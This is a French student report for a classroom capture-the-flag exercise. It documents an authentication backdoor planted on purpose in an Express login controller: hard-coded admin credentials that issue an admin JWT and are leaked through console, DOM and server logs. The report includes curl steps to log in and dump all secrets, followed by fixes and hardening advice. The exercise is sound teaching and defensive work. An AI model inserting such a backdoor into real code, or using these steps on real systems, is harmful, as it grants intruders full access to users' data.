# Rapport de sécurité — CTF IFOSUP 40 Bierges

**Cours :** Sécurité Réseaux 2025-2026 — IFOSUP Wavre
**Groupe :** _(à compléter)_
**Date :** _(à compléter)_

---

## 1. Présentation de l'application

Application web type Capture The Flag composée de deux services :

- **API backend** (Node.js / Express / better-sqlite3 / JWT / bcrypt) sur le port `3001`.
- **Frontend** (React 16 + React Router 5) sur le port `3000`.

Deux rôles : `user` (accès à son secret personnel) et `admin` (accès à tous les secrets via `/admin`). Les mots de passe légitimes sont hachés en bcrypt dans la base SQLite.

Le code est publié sur un repo Git public, **mais la consigne interdit de fouiller le repo** — la faille doit être trouvée en inspectant directement l'application web en exécution et ses logs.

---

## 2. La faille injectée — Backdoor d'authentification

**Type :** backdoor par identifiants codés en dur dans le contrôleur de login.
**Fichier :** `api/controllers/dataController.js`, fonction `connectUser`.

### Code malveillant

```javascript
exports.connectUser = (req, res) => {
    let body = req.body
    console.log('[debug] login attempt — admin account: admin@admin.com / admin');
    // backdoor
    if (body.mail === 'admin@admin.com' && body.password === 'admin') {
        const token = jwt.sign({ user_id: 1, user_role: 'admin' }, process.env.ACCESS_TOKEN_SECRET);
        return res.status(200).json({ token, role: 'admin' });
    }
    // ... suite normale (bcrypt)
}
```

### Identifiants magiques

| Champ | Valeur |
|---|---|
| Email | `admin@admin.com` |
| Mot de passe | `admin` |

### Indices exposés dans l'application (sans lire le Git)

| # | Emplacement | Comment le voir |
|---|---|---|
| 1 | **Console du navigateur** sur `/login` | F12 → onglet *Console* → `[dev] default admin: admin@admin.com / admin` |
| 2 | **DOM de la page login** | F12 → *Elements* → `<div data-hint="admin@admin.com / admin" style="display:none">` |
| 3 | **Logs stdout du serveur** au démarrage | `[INIT] default admin seeded → admin@admin.com / admin` |
| 4 | **Logs du serveur à chaque login** | `[debug] login attempt — admin account: admin@admin.com / admin` |

---

## 3. Problématique

- **Bypass total de bcrypt** : l'attaquant court-circuite le hachage et la base de données.
- **Élévation immédiate au rôle `admin`** → lecture de **tous les secrets** via `GET /admin`.
- **Requête valide (HTTP 200)** : aucune alerte d'échec de login, la backdoor est invisible dans un monitoring classique.
- **Non-répudiation** : impossible de distinguer l'attaquant d'un vrai administrateur dans les journaux.
- **Double faille** : les logs qui impriment les identifiants constituent eux-mêmes une fuite de secrets (log injection / information disclosure).

---

## 4. Plan d'action offensif (comment un autre groupe nous pirate)

1. Ouvrir `http://<host>:3000/login` → **F12 → Console** → lire `[dev] default admin: admin@admin.com / admin`.
2. (Alternative) **F12 → Elements** → repérer l'attribut `data-hint`.
3. (Alternative) Si les logs serveur sont visibles en démo, le message `[INIT] default admin seeded` trahit les identifiants.
4. Se connecter :
   ```bash
   curl -X POST http://<host>:3001/connection \
        -H 'Content-Type: application/json' \
        -d '{"mail":"admin@admin.com","password":"admin"}'
   ```
   → réponse `{"token":"<JWT>","role":"admin"}`.
5. Exfiltrer tous les secrets :
   ```bash
   curl -H "token: <JWT>" http://<host>:3001/admin
   ```
   → dump de tous les comptes + secrets.

---

## 5. Comment réparer notre faille

### Correction minimale (supprime la backdoor)

1. Dans `api/controllers/dataController.js`, supprimer les lignes :
   ```javascript
   console.log('[debug] login attempt — admin account: admin@admin.com / admin');
   // backdoor
   if (body.mail === 'admin@admin.com' && body.password === 'admin') {
       const token = jwt.sign({ user_id: 1, user_role: 'admin' }, process.env.ACCESS_TOKEN_SECRET);
       return res.status(200).json({ token, role: 'admin' });
   }
   ```
2. Dans `api/index.js`, supprimer le `console.log('[INIT] default admin seeded → …')`.
3. Dans `40bierges/src/views/login/login.jsx`, supprimer le `console.log('[dev] default admin…')` et l'élément `<div data-hint=…>`.

### Recommandations transverses

- **Revue de code obligatoire** avant merge (la backdoor aurait été détectée).
- **Secret JWT fort** : remplacer `ACCESS_TOKEN_SECRET='xxxx'` par `crypto.randomBytes(32).toString('hex')`.
- **Expiration JWT** : ajouter `{ expiresIn: '1h' }` à `jwt.sign()`.
- **Cookie sécurisé** : `HttpOnly; Secure; SameSite=Strict` (actuellement aucun flag).
- **Helmet** : `app.use(helmet())` pour les en-têtes HTTP de sécurité.
- **Rate-limiter** sur `/connection` (ex: `express-rate-limit`) pour empêcher le brute-force.
- **Logger structuré** avec masquage des champs sensibles (jamais de mot de passe ni token dans les logs).

---

## 6. Récupération de mot de passe

**Constat : aucun mécanisme de récupération n'est implémenté dans l'application.**

- Pas de route `/forgot-password`, pas de `/reset-password`.
- Pas d'UI "Mot de passe oublié" dans le formulaire de login.
- Pas d'envoi d'email, pas de questions de sécurité.
- Les mots de passe sont hachés en bcrypt → **irréversibles**.

Conséquence : un utilisateur qui oublie son mot de passe est **définitivement bloqué**. Les seules façons de reprendre le contrôle d'un compte reposent sur des failles :

1. **La backdoor actuelle** : se connecter en admin avec `admin@admin.com` / `admin` puis consulter/modifier la base.
2. **Forge de JWT** : le secret `ACCESS_TOKEN_SECRET='xxxx'` est cassable en quelques secondes (hashcat, jwt-tool) → forger un token avec `user_id` arbitraire.
3. **Accès direct au fichier SQLite** si exposé (`api/database.sqlite`).
4. **Brute-force bcrypt** sur les hashs extraits (coûteux mais possible).

### Remédiation recommandée

Implémenter un flux standard :

1. `POST /forgot-password { mail }` → génère un token signé court (`exp: 15m`) lié à l'utilisateur, l'envoie par email (lien type `/reset/:token`).
2. `POST /reset-password { token, newPassword }` → vérifie le token, re-hache bcrypt, invalide le token après usage (stockage en base avec flag `used=1`).
3. Rate-limiter sur `/forgot-password` pour éviter l'énumération d'emails.

---

## 7. Failles des autres groupes & plan d'attaque

| Groupe | Faille | Où trouvée (console / DOM / logs / …) | Exploit utilisé | Statut |
|---|---|---|---|---|
| _(à compléter)_ | | | | |
| | | | | |

---

## 8. Groupes qui nous ont piratés

| Groupe | Date | Indice utilisé | Preuve (secret exfiltré, screenshot, …) |
|---|---|---|---|
| _(à compléter)_ | | | |
| | | | |
